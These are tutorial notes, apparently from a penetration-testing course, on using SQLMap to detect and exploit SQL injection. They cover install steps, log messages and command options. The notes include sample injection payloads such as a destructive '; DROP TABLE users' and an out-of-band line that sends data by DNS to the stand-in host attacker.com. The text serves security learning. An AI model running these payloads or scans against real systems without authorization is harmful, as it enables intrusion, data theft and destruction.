# SQLMap Overview

SQLMap is an open-source penetration testing tool written in Python designed to automate the detection and exploitation of SQL injection (SQLi) vulnerabilities. It has been continuously developed since 2006 and is still actively maintained.

## Basic Usage

SQLMap can be executed with the following basic command:

```bash
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```

The tool automates tasks like detecting injection points, fingerprinting, enumeration, and exploiting vulnerabilities.

---
## SQLMap Features

- **Target connection testing**
- **Injection detection**
- **Fingerprinting of DBMS**
- **Database content retrieval**
- **OS Command Execution**
- **Bypassing WAF/IPS/IDS using tamper scripts**

## Installation

SQLMap is pre-installed on many security-focused operating systems like Pwnbox. To install on Debian-based systems, use:

```bash
sudo apt install sqlmap
```

To install manually, use:

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

Run SQLMap with:

```bash
python sqlmap.py
```

## Supported SQL Injection Types

SQLMap can detect and exploit all known SQL injection types. These include:

### 1. **Boolean-based Blind SQL Injection**
- **Example:**
  ```sql
  AND 1=1
  ```
- Relies on TRUE/FALSE results from server responses.

### 2. **Error-based SQL Injection**
- **Example:**
  ```sql
  AND GTID_SUBSET(@@version,0)
  ```
- Uses DBMS errors to retrieve data in "chunks."

### 3. **Union Query-based SQL Injection**
- **Example:**
  ```sql
  UNION ALL SELECT 1,@@version,3
  ```
- Allows extending queries to inject results into the response.

### 4. **Stacked Queries**
- **Example:**
  ```sql
  ; DROP TABLE users
  ```
- Executes multiple queries in a single request (supported on certain DBMS like Microsoft SQL Server).

### 5. **Time-based Blind SQL Injection**
- **Example:**
  ```sql
  AND 1=IF(2>1,SLEEP(5),0)
  ```
- Differentiates between TRUE/FALSE based on response time.

### 6. **Inline Queries**
- **Example:**
  ```sql
  SELECT (SELECT @@version) from
  ```
- Embeds sub-queries in the original query.

### 7. **Out-of-band SQL Injection**
- **Example:**
  ```sql
  LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
  ```
- Uses DNS exfiltration to retrieve data when other methods are slow or unsupported.

## Additional Features

SQLMap includes advanced techniques like:

- **Protection Detection & Bypass**: Using tamper scripts to avoid WAF/IPS/IDS detection.
- **File System Access**: Retrieving files from the server.
- **OS Command Execution**: Running system commands through SQL injection.

---

# Getting Started with SQLMap

## Basic Help Command
```bash
$ sqlmap -h
```
Shows basic usage and common options.

### Common Options:
- `-u URL`: Target URL (e.g., `http://example.com/vuln?id=1`)
- `-v VERBOSE`: Set verbosity (0-6, default 1)
- `-h`: Show help message
- `--version`: Show version

## Advanced Help Command
```bash
$ sqlmap -hh
```
Shows detailed options for configuring targets, requests, and connection methods.

## Example Usage
Test for SQL injection on a target URL:
```bash
sqlmap -u "http://example.com/vuln.php?id=1" --batch
```

- **`--batch`**: Skip user input, use default choices.

## Output Overview:
- **Testing**: SQLMap checks for vulnerabilities in the URL.
- **Injection Points**: Identifies if parameters (like `id`) are vulnerable to SQLi.
- **Payloads**: Tests various SQLi payloads like boolean-based, time-based, or error-based.

---

# SQLMap Output Messages Description

## Common Log Messages

### 1. **Target URL Content is Stable**
   - **Message**: "target URL content is stable"
   - **Meaning**: The response to requests remains consistent, making it easier to spot changes caused by SQLi attempts.

### 2. **Parameter Appears to be Dynamic**
   - **Message**: "GET parameter 'id' appears to be dynamic"
   - **Meaning**: The parameter's value changes with each request, indicating it may interact with a database.

### 3. **Parameter Might be Injectable**
   - **Message**: "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"
   - **Meaning**: The parameter shows signs of potential SQL injection, typically identified by DBMS errors.

### 4. **Parameter Vulnerable to XSS**
   - **Message**: "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"
   - **Meaning**: SQLMap also checks for XSS vulnerabilities alongside SQLi vulnerabilities.

### 5. **Back-end DBMS Identified**
   - **Message**: "it looks like the back-end DBMS is 'MySQL'."
   - **Meaning**: The target is identified as using MySQL, allowing SQLMap to focus payloads specific to this DBMS.

### 6. **Level/Risk Values**
   - **Message**: "Do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values?"
   - **Meaning**: Option to extend SQLMap's tests for MySQL based on detected risk level.

### 7. **Reflective Values Found**
   - **Message**: "reflective value(s) found and filtering out"
   - **Meaning**: Potential junk found in the response, which SQLMap filters out to ensure accurate results.

### 8. **Injection Point Appears Usable**
   - **Message**: "GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable"
   - **Meaning**: Indicates the parameter is vulnerable to SQL injection, with the specified technique.

### 9. **Time-Based Comparison Model**
   - **Message**: "time-based comparison requires a larger statistical model, please wait"
   - **Meaning**: SQLMap collects response data to recognize delays caused by time-based blind SQLi.

### 10. **Extending UNION Query Tests**
   - **Message**: "automatically extending ranges for UNION query injection technique tests"
   - **Meaning**: SQLMap extends tests if multiple techniques are found, improving the chances of successful UNION SQLi detection.

### 11. **Technique Usability Check**
   - **Message**: "'ORDER BY' technique appears to be usable"
   - **Meaning**: The 'ORDER BY' technique is usable to quickly identify the number of required UNION query columns.

### 12. **Parameter is Vulnerable**
   - **Message**: "GET parameter 'id' is vulnerable."
   - **Meaning**: A key message indicating the parameter is indeed vulnerable to SQL injection.

### 13. **Injection Points Identified**
   - **Message**: "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests"
   - **Meaning**: SQLMap lists exploitable injection points found in the target URL.

### 14. **Data Logged to Files**
   - **Message**: "fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"
   - **Meaning**: SQLMap stores session data and output in the specified directory for future use.

---

# Running SQLMap on an HTTP Request

## Introduction
SQLMap allows for extensive customization when targeting HTTP requests for SQL injection testing. Below are key methods to configure and run SQLMap effectively using HTTP requests.

## cURL Command Setup

### Copy as cURL Feature
- **How to use**: Copy the HTTP request from your browser's Developer Tools (e.g., Chrome, Firefox, Edge) and convert it into a SQLMap command.
- **Example**:
  ```bash
  sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
  ```

## GET/POST Requests

### GET Requests
- Use the `-u`/`--url` flag to specify the URL with parameters.
- **Example**:
  ```bash
  sqlmap 'http://www.example.com/?id=1'
  ```

### POST Requests
- Use the `--data` flag to send POST data for testing.
- **Example**:
  ```bash
  sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
  ```

### Targeting Specific Parameters
- Use `-p` to target specific parameters for SQLi testing.
- **Example**:
  ```bash
  sqlmap 'http://www.example.com/' --data 'uid=1&name=test' -p uid
  ```

### Using Asterisk (*) in POST Data
- Mark the parameter to be tested for SQLi with `*` in the data.
- **Example**:
  ```bash
  sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
  ```

## Full HTTP Requests

### Request File (-r)
- Capture the full HTTP request (headers, method, body) using tools like Burp Suite or browser Developer Tools, and save it to a file.
- **Example Request File**:
  ```http
  GET /?id=1 HTTP/1.1
  Host: www.example.com
  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  ```
- **Running SQLMap with the Request File**:
  ```bash
  sqlmap -r req.txt
  ```

### Custom Injection Mark in Request File
- Mark the parameter for SQLi testing with `*` in the request file (e.g., `/?id=*`).

## Custom SQLMap Requests

### Using Cookies
- Use `--cookie` to specify session cookie values.
- **Example**:
  ```bash
  sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
  ```

### Custom Headers
- Use `-H`/`--header` to add custom HTTP headers.
- **Example**:
  ```bash
  sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
  ```

### Random User-Agent
- Use `--random-agent` to randomize the User-Agent header.
- **Example**:
  ```bash
  sqlmap --random-agent
  ```

### Custom HTTP Methods
- Use `--method` to specify HTTP methods like PUT.
- **Example**:
  ```bash
  sqlmap -u www.target.com --data='id=1' --method PUT
  ```

## Custom HTTP Request Formats

### JSON and XML Requests
- SQLMap can handle POST data in JSON and XML formats. For complex requests, use the `-r` flag with a request file.
  
- **Example JSON Request**:
  ```json
  {
    "data": [{
      "type": "articles",
      "id": "1",
      "attributes": {
        "title": "Example JSON",
        "body": "Just an example"
      }
    }]
  }
  ```
  
- **Running SQLMap with JSON Request**:
  ```bash
  sqlmap -r req.txt
  ```

---

# Handling SQLMap Errors

## Display Errors
Use `--parse-errors` to capture and display any DBMS error messages that occur during the scan. This can help you understand if there are issues with the SQL queries being executed, such as syntax errors or permission issues.

## Store the Traffic
Use `-t` to store all HTTP traffic (requests and responses) in a file. This allows you to manually review the traffic, which can help diagnose issues with how SQLMap is interacting with the target, or if there are any issues in the HTTP request/response process.
```
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

## Verbose Output
Use `-v` to increase the verbosity level of SQLMap's output. This will give you more detailed logs about the actions SQLMap is performing, including headers, responses, and debugging information. This is useful for identifying issues during the attack process.

```
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

## Using Proxy
Use `--proxy` to route SQLMap's traffic through an external proxy (such as Burp Suite). This allows you to inspect, modify, and replay requests and responses within the proxy, providing deeper insights into the traffic and interactions between SQLMap and the target.

---

